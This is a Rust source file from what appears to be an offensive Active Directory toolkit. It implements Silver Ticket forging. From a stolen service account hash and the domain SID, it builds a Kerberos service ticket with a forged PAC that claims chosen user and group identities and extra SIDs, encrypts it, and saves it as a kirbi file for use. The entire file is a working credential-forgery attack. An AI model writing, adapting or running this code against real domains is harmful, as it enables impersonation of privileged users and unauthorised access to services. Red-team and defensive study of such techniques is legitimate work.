//! Silver Ticket forging — forge a service ticket using a service account's key.
//!
//! Unlike Golden Tickets, Silver Tickets target a specific SPN and never
//! touch the KDC — they go directly to the target service.

use overthrone_core::error::{OverthroneError, Result};
use overthrone_core::proto::kerberos::{ETYPE_AES256_CTS, ETYPE_RC4_HMAC, NT_PRINCIPAL, NT_SRV_INST};
use chrono::{Duration, Utc};
use kerberos_asn1::{
    Asn1Object, EncTicketPart, EncryptedData, KerberosFlags, KerberosTime,
    PrincipalName, Ticket, TransitedEncoding,
};
use kerberos_crypto::new_kerberos_cipher;
use tracing::{info, warn};

use crate::golden::{self};
use crate::runner::{ForgeConfig, ForgeResult, ForgedTicket};
use crate::validate;

/// Forge a Silver Ticket (service ticket encrypted with service account key).
pub async fn forge_silver_ticket(
    config: &ForgeConfig,
    target_spn: &str,
) -> Result<ForgeResult> {
    info!("[silver] Forging Silver Ticket for SPN: {}", target_spn);

    let service_hash = config.service_hash.as_deref()
        .ok_or_else(|| OverthroneError::TicketForge(
            "Service account hash (--service-hash) is required for Silver Ticket".into()
        ))?;

    let domain_sid = config.domain_sid.as_deref()
        .ok_or_else(|| OverthroneError::TicketForge(
            "Domain SID (--domain-sid) is required for Silver Ticket".into()
        ))?;

    validate::validate_sid_format(domain_sid)?;

    let key_bytes = hex::decode(service_hash.trim())
        .map_err(|e| OverthroneError::TicketForge(format!("Invalid hash: {e}")))?;

    let etype = match key_bytes.len() {
        16 => ETYPE_RC4_HMAC,
        32 => ETYPE_AES256_CTS,
        _ => return Err(OverthroneError::TicketForge(
            format!("Service hash must be 16 (RC4) or 32 (AES256) bytes, got {}", key_bytes.len())
        )),
    };

    let realm = config.domain.to_uppercase();
    let impersonate = config.effective_impersonate();
    let groups = config.effective_groups();
    let lifetime = config.effective_lifetime();

    // Parse SPN into PrincipalName
    let spn_parts: Vec<&str> = target_spn.splitn(2, '/').collect();
    if spn_parts.len() < 2 {
        return Err(OverthroneError::TicketForge(
            format!("Invalid SPN format '{}'. Expected 'service/host'", target_spn)
        ));
    }

    let sname = PrincipalName {
        name_type: NT_SRV_INST,
        name_string: spn_parts.iter().map(|s| s.to_string()).collect(),
    };

    info!("[silver] User={}, SPN={}, Etype={}, Groups={:?}",
        impersonate, target_spn, etype, groups
    );

    // Build PAC
    let pac_bytes = golden::build_pac(
        impersonate, &realm, domain_sid,
        config.user_rid, &groups, &config.extra_sids,
        &key_bytes, etype,
    )?;

    let now = Utc::now();
    let session_key = golden::generate_session_key(etype);

    let enc_ticket_part = EncTicketPart {
        flags: silver_ticket_flags(),
        key: kerberos_asn1::EncryptionKey {
            keytype: etype,
            keyvalue: session_key.clone(),
        },
        crealm: realm.clone(),
        cname: PrincipalName {
            name_type: NT_PRINCIPAL,
            name_string: vec![impersonate.to_string()],
        },
        transited: TransitedEncoding {
            tr_type: 1,
            contents: Vec::new(),
        },
        authtime: KerberosTime::from(now),
        starttime: Some(KerberosTime::from(now)),
        endtime: KerberosTime::from(now + Duration::hours(lifetime as i64)),
        renew_till: Some(KerberosTime::from(now + Duration::days(7))),
        caddr: None,
        authorization_data: Some(vec![kerberos_asn1::AuthorizationDataEntry {
            ad_type: 1,
            ad_data: pac_bytes,
        }]),
    };

    // Encrypt with service account key (key_usage=2 for ticket enc-part)
    let cipher = new_kerberos_cipher(etype)
        .map_err(|e| OverthroneError::TicketForge(format!("Cipher: {e}")))?;
    let encrypted = cipher.encrypt(&key_bytes, 2, &enc_ticket_part.build());

    let ticket = Ticket {
        tkt_vno: 5,
        realm: realm.clone(),
        sname,
        enc_part: EncryptedData {
            etype,
            kvno: Some(1),
            cipher: encrypted,
        },
    };

    let ticket_bytes = ticket.build();
    let kirbi_bytes = golden::build_krb_cred(&ticket, &enc_ticket_part, &session_key, etype)?;
    let kirbi_path = golden::save_ticket(config, &kirbi_bytes, "silver")?;
    let etype_str = golden::etype_name(etype);

    info!("[silver] Silver Ticket forged for {} ({} bytes)", target_spn, ticket_bytes.len());

    Ok(ForgeResult {
        action: format!("Silver Ticket ({})", target_spn),
        domain: config.domain.clone(),
        success: true,
        ticket_data: Some(ForgedTicket {
            ticket_type: "Silver Ticket (Service)".into(),
            impersonated_user: impersonate.to_string(),
            domain: realm,
            spn: target_spn.to_string(),
            encryption_type: etype_str.into(),
            valid_from: now.format("%Y-%m-%d %H:%M:%S UTC").to_string(),
            valid_until: (now + Duration::hours(lifetime as i64))
                .format("%Y-%m-%d %H:%M:%S UTC").to_string(),
            group_rids: groups,
            extra_sids: config.extra_sids.clone(),
            kirbi_path,
            ccache_path: None,
            kirbi_base64: Some(golden::base64_encode(&kirbi_bytes)),
            ticket_size_bytes: ticket_bytes.len(),
        }),
        persistence_result: None,
        message: format!("Silver Ticket forged for SPN {} as {} ({})",
            target_spn, impersonate, etype_str
        ),
    })
}

fn silver_ticket_flags() -> KerberosFlags {
    let flags: u32 = 0x40A00000; // FORWARDABLE | RENEWABLE | PRE_AUTHENT
    KerberosFlags {
        flags,
    }
}
